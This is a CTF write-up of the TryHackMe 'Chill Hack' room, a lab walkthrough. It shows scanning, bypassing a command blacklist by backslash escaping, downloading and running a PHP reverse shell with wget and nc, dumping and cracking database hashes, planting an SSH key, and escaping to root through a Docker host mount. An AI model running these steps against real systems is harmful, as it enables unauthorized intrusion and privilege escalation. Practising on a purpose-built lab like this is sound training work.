---
title: "THM:chillhack"
subtitle: "TryHackMe CTF room: https://tryhackme.com/room/chillhack"
category: "CTF"
tags: ctf,nmap,gobuster,dirbuster,session,broken-authentication,javascript,apache,ubuntu,john,gpg2john,linpeas,privesc,cron
---
# THM:chillhack

URL: [https://tryhackme.com/room/chillhack](https://tryhackme.com/room/chillhack) [Easy]

Tags: 
<div style="margin-left: 5px;">
{% assign tags = page.tags | split: "," %}
{% for tag in tags %}
<a href="../search/?q={{tag}}" title="Click to search by this tag"><span class="badge bg-secondary">{{tag}}</span></a>
{% endfor %}
</div>
<hr>

## Reconnaissance

Description of the room:

> Easy level CTF.  Capture the flags and have fun!

## Scanning

### Running: `nmap`

Ran the following:

> `nmap -sC -sV x.x.x.x`

Interesting ports found to be open:

```python
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.78.155
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Game Info
|_http-server-header: Apache/2.4.29 (Ubuntu)

```

Also see: [nmap.log](nmap.log)

### Running: `gobuster`

Ran the following:

> `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://x.x.x.x`

Interesting folders found on `:80`:

```python
/secret      (Status: 301) [Size: 315] [--> http://10.10.168.235/secret/]
```

Also see: [gobuster.log](gobuster.log)

### Running: `nikto`

Ran the following:

> `nikto -h x.x.x.x -p 80`

Not much of anything interesting info found on `:80`:

```python
+ Server: Apache/2.4.29 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /images: IP address found in the 'location' header. The IP is "127.0.1.1". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ /: Server may leak inodes via ETags, header found with file /, inode: 8970, size: 56d7e303a7e80, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, HEAD, GET .
+ /css/: Directory indexing found.
+ /css/: This might be interesting.
+ /secret/: This might be interesting.
+ /images/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
```

Also see: [nikto.log](nikto.log)

## Gaining Access

The most obvious place to start is in the `/secret/` folder via the web browser. This lets you run Linux commands, and it shows you the output. However, you quickly find out several commands are blocked and it shows you a "Are you a hacker?" message.

One command to run is `sudo -l` which will show you if the current user is able to run anything as `root`. We find that account `apaar` can run `/home/apaar/.helpline.sh` as sudo.

We can't seem to do `cat` or `less` to read files, so we can read parts of file with something like: `grep -v "zZz" /home/apaar/.helpline.sh`. This tells grep to show me all of the lines of the file that *DON'T* have the character string "zZz", which is most-likely all of the lines of the file.

Using that same `grep` technique, we can look at the `index.php` for `/secret/` and see the actual blacklist of commands we cannot run:

```php
$blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls'); 
```

Knowing that this is looking for an exact string, we can bypass this telling bash we want to treat the next character as a "string" literal, by using a backslash. For example: `c\at ./index.php` is technically equivalent to `cat ./index.php`, but for the first one, we were just saying that the "a" of "cat" is a string-literal (which is already was).

How do we get in, then?

### Unprivileged Access

There are several interesting aspects to this server.

#### PHP Reverse Shell

By using the technique above, we see that our default user `www-data` does not have write access anywhere, we can always write to the `/tmp/` folder. We also know from the `$blacklist` above that PHP is installed on the current server. We can straight-up just run `php somefile.php` from the command-line, even without a web server.

Putting this together, we can:

1. Go [grab a PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and download that to our workstation, say to `~/Downloads/`. Rename it to `revshell.php`.
1. Edit that file and modify the IP address to be your workstation IP, and the port to be `9000`.
1. Navigate into `~/Downloads/` and run `python3 -m http.server 8000` - this is a temporary web server from where our victim machine can download the reverse shell.
1. From the `/secret/` website on the victim machine, run: `wget -O /tmp/revshell.php http://<WorkstationIP>:8000/revshell.php` - this will download the configured reverse shell from our Python3 web server that is hosting files from our `~/Downloads/` folder.
1. Now that `/tmp/revshell.php` exists on the target machine, and we know how to bypass the filtering, we first need to listen for the incoming reverse shell. So, on your workstation, run: `nc -lvnp 9000` (note that we configured the reverse shell in step 1 to point to port 9000)
1. Finally, from `/secret/` web page run the command: `p\hp /tmp/revshell.php`. You should see a connecting session back on your netcat terminal! You now have a primitive shell connection, running as the `www-data` user.

#### MySQL Direct Access

Either via the shell above, or by using the `/secret/` web page to run commands, you might view the file `/var/www/files/index.php`, which is a login page. However, it references `/var/www/files/account.php`.

In `account.php`, we can see the `root` database credentials for the local MySQL instance! So, that means we can run:

```bash
mysql -u root -p
```

And then paste in the password that you get from that `account.php` page. If not familiar, here is how you might go see the databases and tables:

```mysql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| webportal          |
+--------------------+
5 rows in set (0.01 sec)

mysql> use webportal;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------+
| Tables_in_webportal |
+---------------------+
| users               |
+---------------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53<.....REDACTED.....>806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 6862<.....REDACTED.....>c789a649 |
+----+-----------+----------+-----------+----------------------------------+
2 rows in set (0.00 sec)
```

Why this was interesting was that the password hashes in the `password` field were very short, and could potentially by MD5 hashes. So, using a website like this: [https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash), I pasted in those values and we can see what the clear-text passwords are for those of those accounts!

#### SSH'ing In

We attempt to SSH into the server using the MD5 password above but that doesn't work. We do know that we can run that one script file AS the `apaar` account though. So, via your reverse shell above, run:

```bash
sudo -u apaar /home/apaar/.helpline.sh
```

It prompts you for a name; you can put anything for that. Then it prompts you for a message. That should be: `/bin/bash`

You will now have a prompt running as `apaar`. So, you can inject your `~/.ssh/id_rsa.pub` public key into `apaar`'s `authorized_keys` files so that you can SSH in as `apaar` without being prompted for an SSH password. So, while we are running as `apaar`, run something like:

```bash
echo "ssh-rsa AAAAB3Nza<--SNIP-->udTRuFA8= user@example.com" >> /home/apaar/.ssh/authorized_keys
```

Where those contents would be your own public key from `~/.ssh/id_rsa.pub` on your workstation. If that file does not exist, run `ssh-keygen` and take all of the defaults (and you shouldn't set a password, in this particular case).

Finally, you can now `ssh apaar@<machine-ip>` and you should not be prompted for a password. You now have a proper SSH prompt running as `apaar`.


## Privilege Escalation

This is a bit unrealistic and convoluted, but I suppose it is a good reinforcement of these skills that we learn! Here is the summary of the kill-chain to get privilege escalation:

1. Run `netstat -tupln` see we're hosting a site on `localhost:9001`
2. Use `ssh -L` port redirection to re-host that website locally on our workstation.
3. Use `apaar`'s database username and password to log in to this website.
4. Grab the hacker picture. Run: `steghide extract -sf ./hacker-with-laptop_23-2147985341.jpg` and it extracts a `backup.zip`
5. Run: `fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt ./backup.zip` to try to crack the ZIP password.
6. Run: `unzip ./backup.zip`, use the password you just found to reveal: `source_code.php`.
7. We see this references uses `anurodh` and a password that is base64-encoded.
8. Run: `echo "password" | base64 -d` to base64-decode the password to clear-text.
9. Now we can log in as this other user. We run: `su anurodh` and use the password from above.

Also see: [backup.zip](backup.zip), [hacker-with-laptop_23-2147985341.jpg](hacker-with-laptop_23-2147985341.jpg), and [source_code.php](source_code.php)

Let me stop and highlight this next part, because it's pretty interesting!

### Docker Filesystem Breakout / Escape

This user `anurodh` doesn't have any additional `sudo` privilege and `linpeas` didn't find much. However, `anurodh` does have privileges to use Docker. Docker containers run in a "namespace" within Linux. When a container is running as `root`, there are potential ways to jump over that namespace and into the host machine. If we run `docker images`, we can see that have an Alpine Linux image. This means we can try:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

This basically: starts a container running `alpine`, mounts the host `/` path to `/mnt/` inside of the container, then it changes the "root" of the filesystem within the container to be `/mnt/`, and then starts a shell.

The end result is kind of weird. We are running as root, our "file system" inside fo the container is literally the same as the host machine. That means we can pretty much do most (all?) things that `root` can do in the host system? Well, at the very least we can grab our final flag of `/root/proof.txt`, which completes the room.

As for that `docker` command above, here's a breakdown of each part of the command:

* `docker run`: This initiates the execution of a Docker container.
* `-v /:/mnt`: This flag specifies a volume binding, allowing the root directory ("/") of the host system to be mounted at "/mnt" within the container. This can be risky as it provides the container with access to the entire host filesystem.
* `--rm`: This flag indicates that the container should be automatically removed once it exits.
* `-it`: These flags enable an interactive terminal session with the container.
* `alpine`: This is the name of the Docker image you are running. It indicates that you want to use the Alpine Linux image.
* `chroot /mnt sh`: This command is executed within the container. It attempts to change the root directory of the container's environment to "/mnt" (which is actually the root directory of the host system due to the volume binding) and then starts an interactive shell (sh) within that changed root directory. This can give you access to the host's filesystem from within the container.


Completed: [`2023-08-20 23:30:28`]